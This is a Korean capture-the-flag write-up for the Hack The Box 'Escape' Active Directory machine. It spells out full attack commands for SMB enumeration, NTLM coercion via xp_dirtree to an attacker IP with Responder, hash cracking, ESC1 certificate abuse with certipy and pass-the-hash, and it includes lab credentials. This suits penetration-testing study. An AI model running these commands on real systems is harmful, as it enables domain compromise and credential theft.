# HTB-ESCAPE
```bash
OS: Windows(AD)
DATE: 26.10.22
DIFFICULTY: Medium
```

## RECON
**nmap**: 초기 정찰을 위해 전체 포트 검사 및 상세 포트 검사를 진행하였다
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49713,49722,49743 IP | tee nmap
```
```bash
sudo nmap -sUV --top-ports 100 IP
```

검사 결과 88, 389, 445 등이 열려있는 것으로 보아 AD DC 서버인 것 같았다. 따라서 먼저 SMB 서비스부터 열거하였다.
```bash
nxc smb IP -u '' -p ''
```

그 결과 `sequel.htb`라는 도메인을 알 수 있었고, nmap 상세 정보를 통해 `dc.sequel.htb`라는 도메인도 있다는 것을 알게 되어 IP 매핑해 준 후 SMB 서비스를 Guest 계정으로 접속이 가능한지 그리고 user 리스트를 뽑을 수 있는지 확인해주었다.
```bash
smbclient -L //sequel.htb -N
```
```bash
nxc smb sequel.htb -u '' -p '' --rid-brute | grep SidTypeUser | awk -F'\\\\' '{print $2}' | awk '{print $1}' | tee users
```

이후 SMB에 `Public` 폴더가 있는 것을 알게 되었고 Guest 계정으로 --rid-brute 또한 가능한 것을 알게 되어 유저명만 모아주는 명령어를 사용하여 `users`라는 파일에 담아주었다. 이후 발견한 `Public` 폴더에 접근하여 안에 있는 파일을 get해주었다.
```bash
smbclient //sequel.htb/Public -N
smb> get "SQL Server Procedures.pdf"
```

그 결과 **SQL Server Procedures.pdf** 라는 파일을 받을 수 있었다.

## Initial Access
따라서 **SQL Server Procedures.pdf** 안에 내용을 확인해주었다.
```bash
open "SQL Server Procedures.pdf"
```
```
Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

파일 확인 결과 초기 MSSQL 서버에 접속할 수 있는 크레덴셜이 적혀있었다. 따라서 `mssqlclient.py` 툴을 사용하여 접속을 시도하였다.
```bash
mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@IP
```

접속 후 DB 내용 등을 확인해보았지만 기본 DB들과 테이블 밖에 없었다. 따라서 권한이 DBO가 아니기에 `xp_dirtree`를 사용하여 파일 내용들을 확인해주었다.
```sql
SQL (PublicUser  guest@master)> xp_dirtree
subdirectory   depth   file
------------   -----   ----
```

하지만 아무것도 출력이 되지 않았다. 이유를 알고 보니 SQLMOCK이라는 모의 쉘이라 뒤에 실제 파일 시스템이 없고 UNC 경로로 외부 인증을 유발할 때만 공격이 발생할 수 있는 상황이었다. 따라서 sql 창에다 내 IP를 찍어 접속하게 한 후 유저의 NTLMv2 hash를 얻는 exploit 계획을 짰다. 따라서 responder를 켜준 후 공격을 진행하였다.
```bash
sudo responder -I tun0
```
```sql
xp_dirtree '\\IP\share\test.txt'
```

하지만 공격이 불가능하였다. 알고보니 그냥 `xp_dirtree`는 정식 방식이 아니라 씹일 수도 있다는 사실을 간과하고 있었다. 따라서 정석 방법인 exec를 호출하고 다시 한번 더 시도해보았다.
```sql
exec master..xp_dirtree '\\IP\share\test.txt'
```

그 결과 대기하고 있던 responder에서 **sql_svc**라는 계정의 해시를 얻을 수 있게 되었다. 이후 얻은 hash를 crack해주었다.
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

따라서 sql_svc의 평문 비밀번호를 얻게 되어 nxc 등으로 쉘 접속 여부를 확인 후 접속 가능하여 쉘을 얻을 수 있었다.
```bash
evil-winrm -i IP -u sql_svc -p PASS
```

접속 후 bloodhound도 돌려보고 많은 방법을 시도하였지만 다른 유저로 권한상승 길이 안보였다. 따라서 유저 쉘 안에 있는 디렉토리들을 뒤져보았다. 계속해서 열거한 결과 `C:\SQLServer\Logs`라는 위치에 **ERRORLOG.BAK**라는 백업 파일이 있어 로컬로 옮겨준 후 확인해주었다.
```ps1
download C:\SQLServer\Logs\ERRORLOG.BAK
```
```bak
2022-11-18 13:43:07.34 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'user instances enabled' changed from 1 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.44 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a 'stop' request from Service Control Manager. This is an informational message only. No user action is required.
2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
```

확인 결과 오류를 모아둔 로그 파일인 것 같았다. 자세히 살펴본 결과 처음 **Ryan.Cooper**라는 유저로 로그인을 틀려서 실패하고 **NuclearMosquito3**라는 유저로 로그인한 결과 실패하여 패스워드를 유저 창에 넣은 실수 같아 Ryan.Cooper라는 유저 크레덴셜이 맞는지 nxc로 확인해보았다.
```bash
nxc smb IP -u Ryan.Cooper -p NuclearMosquito3
```

확인 결과 맞는 유저여서 유저 쉘로 접속하였다.
```bash
evil-winrm -i IP -u Ryan.Cooper -p NuclearMosquito3
```
![user](attach_real/Pasted%20image%2020261023101415.png)

## Privilege Escalation
유저 쉘을 얻고 많은 것을 확인해보았다. `whoami /all`, bloodhound 등등 하지만 모두 실패하여 마지막은 CA를 확인해주었다.
```bash
certipy-ad find -username Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip IP -vulnerable -stdout
[*] Enumeration output:
Certificate Authorities
0
CA Name                             : sequel-DC-CA
DNS Name                            : dc.sequel.htb
Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
Certificate Validity Start          : 2022-11-18 20:58:46+00:00
Certificate Validity End            : 2121-11-18 21:08:46+00:00
[!] Vulnerabilities
ESC1                              : Enrollee supplies subject and template allows client authentication.
```

`certipy-ad find` 기능으로 검사해본 결과 ESC1 취약점이 있다는 것을 알게 되었다. ESC1은 CA가 도메인 인증을 허용시키고 낮은 권한 주체가 enroll이 가능하다. 그리고 가장 중요한 `Enrollee Supplies Subject = True` 이렇게 형성되어있다. 정상적인 흐름에선 CA가 너는 Ryan이니까 Ryan 이름으로 인증서를 발급해준다고 해야하지만 요청자 신원을 보고 주체를 결정하기에 내가 누구 이름으로 받을지 정하면 exploit이 가능하다. 따라서 바로 exploit을 진행해주었다.
```bash
certipy req -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -ca 'sequel-DC-CA' -target dc.sequel.htb -template UserAuthentication -upn administrator@sequel.htb
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 17
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

하지만 오류가 발생하고 실행이 되지 않았다. 알고 보니 타이밍 문제여서 다시 실행해보니 성공하였다. 이제 `administrator.pfx` 파일을 얻었기 때문에 NTLM 해시를 얻어주었다.
```bash
certipy auth -pfx administrator.pfx -dc-ip IP
```

그 결과 admin NTLM hash를 얻을 수 있게 되었고 PTH가 가능해졌기에 hash를 이용하여 쉘에 접근하였다.
```bash
evil-winrm -i IP -u administrator -H HASH
```

그 결과 root.txt 플래그를 얻을 수 있었다.

![root](attach_real/Pasted%20image%2020261023183649.png)

## New Inform
- xp_dirtree : MSSQL에 기본 내장된 확장 저장 프로시저 `xp_dirtree '경로', depth, file_flag`
- 그냥 xp_dirtree해서 안보일 수도 있음 SQLMOCK이라는 모의 쉘이라 like rbash
- 항상 그냥 xp_dirtree를 사용하지말고 정식 문법을 사용하자
- 그냥 xp_dirtree를 사용하면 씹일 수도 있기때문에 `exec master..xp_dirtree` 붙혀서 사용
- 항상 MSSQL 서비스가 있으면 NTLM Authentication Coercion을 시도하자 xp_dirtree에서 smb를 호출하여 강제 인증 시도
- 진짜 제발 꼼꼼히 제발 꼼꼼히 확인하자
- 처음보는 서비스가 있으면 그냥 무조건 접속 그리고 열거 계속해서
- backup 파일을 얻고 나서 더 꼼꼼히 확인하자
- 유저명 입력창에 패스워드를 잘못쳤을 수 있음 무조건
- 문제가 생기면 항상 유저명 잘못 적었는지 확인하고 날짜 확인
- 그리고 sid 추가해주면 좋음
- 타이밍 문제로 오류날 수 있으니까 한번더 시도하셈
- 항상 CA 확인 계정에 따라 결과값이 다를 수 있음
